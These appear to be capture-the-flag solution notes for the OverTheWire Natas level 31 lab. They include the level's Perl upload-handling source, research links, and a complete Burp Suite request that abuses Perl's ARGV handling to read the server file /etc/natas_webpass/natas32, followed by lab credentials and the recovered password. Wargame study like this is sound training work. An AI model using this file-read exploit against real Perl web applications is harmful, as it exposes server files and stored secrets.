import requests
from requests.auth import HTTPBasicAuth

url = "http://natas31.natas.labs.overthewire.org/"
auth = HTTPBasicAuth("natas31", "m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y")

$ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";
...

my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}

https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/code-execution-via-file-upload/
https://owasp.org/www-chapter-pune/meetups/2023/Jan/File-upload-Vulnerability-Praveen-Sutar.pptx.pdf
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
https://codeql.github.com/codeql-query-help/cpp/cpp-cgi-xss/ <- seems like escapeHTML is the good practice

noticing response headers:
HTTP/1.1 200 OK
Date: Sat, 30 Aug 2025 02:44:50 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 815
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

https://zaynar.co.uk/posts/charset-encoding-xss/

but iso-8859-1 seems to be on par with UTF-8...

https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf?ref=learnhacking.io

done with burpsuite:

POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 383
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Accept-Language: en-US,en;q=0.9
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6hv5dpD7Q9ABkWoL
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas31.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.1.1947089201.1755739126; _ga_RD0K2239G0=GS2.1.s1756528588$o2$g1$t1756528596$j52$l0$h0
Connection: keep-alive

------WebKitFormBoundary6hv5dpD7Q9ABkWoL
Content-Disposition: form-data; name="file"

ARGV
------WebKitFormBoundary6hv5dpD7Q9ABkWoL
Content-Disposition: form-data; name="file"; filename="just-a.csv"
Content-Type: text/csv

a;b
c;d
------WebKitFormBoundary6hv5dpD7Q9ABkWoL
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary6hv5dpD7Q9ABkWoL--

NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
